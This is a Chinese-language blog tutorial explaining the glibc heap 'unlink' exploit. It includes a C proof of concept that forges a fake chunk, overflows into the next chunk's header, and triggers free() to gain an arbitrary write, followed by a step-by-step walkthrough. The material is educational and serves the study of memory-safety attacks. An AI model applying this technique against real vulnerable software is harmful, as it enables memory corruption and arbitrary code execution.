---
title: "heap利用 4/9: Unlink Exploit"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---

<br>

unlink exploit曾经是一种很常见的攻击，但是后来`unlink` MACRO中添加了两项能够抵御该类攻击的安全检查("corrupted size vs. prev_size"和“corrupted double-linked list”)，尽管如此，花一些时间去了解这种攻击还是很值得的。

unlink exploit在利用`unlink` MACRO中指针操作的同时，会在`bin`中移除一个`chunk`。下列代码展示了一个这种攻击的案例。(完整代码见[此处](https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c))

```C
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x80);        // Points to 0xa0e010
chunk2 = malloc(0x80);        // Points to 0xa0e0a0

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x80;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;   // hex for "hacked!"

printf("%s\n", data);         // Prints "hacked!"
```

<br>

unlink exploit与其他攻击相比，可能看起来有点复杂，具体攻击操作如下。首先，使用`malloc`为块`chunk1`和`chunk2`申请大小为`0x80`的内存空间，确保它们在smallbin范围内，此时**chunk1和chunk2在内存空间中并排排列**。然后假设攻击者以某种方式对`chunk1`的内容拥有无限的控制权（使用任何"不安全"的函数，例如用户输入的`strcpy`)。为了能够更加清楚的介绍原理，上面的示例代码使用自定义结构`chunk_structure`，而在实际的攻击场景中，攻击者只需发送字节来填充`chunk1`就可达到与上述所示相同的效果。

申请内存空间后，系统会在`chunk1`的"data"部分创建了一个新的假块，然后调整`fd`和`bk`指针来通过 "corrupted double-linked list" 安全检查。攻击者在发动攻击时，攻击内容会溢出到`chunk2`的标头中，此时在该标头设置适当的`prev_size`和`prev_in_use`来确保每次释放`chunk2`时,`fake_chunk`会被检测为空闲状态然后被 "unlink" 。下图显示了各个内存区域的当前状态:

![Unlink before call to free](../image/heap_exploit_unlink_exploit-1.png)


了解如何通过(`P->fd->bk ==P`和`P-> bk->fd == P`检查，可以帮助学习如何调整假块的`fd`和`bk`指针。一旦`chunk2`被释放，它就会被当作一个小型的bin处理。回想一下，内存空间中`chunk2`上一个和下一个的块不管是否空闲，都会被进行安全检查，如果有块被检测为“空闲”，该块则会被 "unlink" ，然后被合并为连续的空闲块。`unlink` MACRO会执行以下两个修改指针的指令:
1. 设置`P->fd->bk = P->bk`。
2. 设置`P->bk->fd = P->fd`。

在这种情况下，`P->fd->bk`和`P->bk->fd`都指向同一位置，因此只有第二次更新被注意到。下图显示了释放`chunk2`后第二次更新的效果。

![Unlink after call to free](../image/heap_exploit_unlink_exploit-2.png)

此时，`chunk1`指向自身后面的3个地址(16位)(`&chunk1 - 3`），`chunk1[3]`实际上就是`chunk1`，更改`chunk1[3]`就像更改`chunk1`。攻击者更有可能在`chunk1`的位置 (此处为`chunk1[3]`)而不是`chunk1`本身修改数据，在此示例中，`chunk1`指向 "data" 变量，并且通过`chunk1`的更改反映在该变量上。

早些时候`unlink`中没有安全检查，`unlink` MACRO中的两条写入指令可以用于实现任意写入，因此攻击者可以通过覆盖`﹒got`部分来执行任意恶意代码的漏洞。

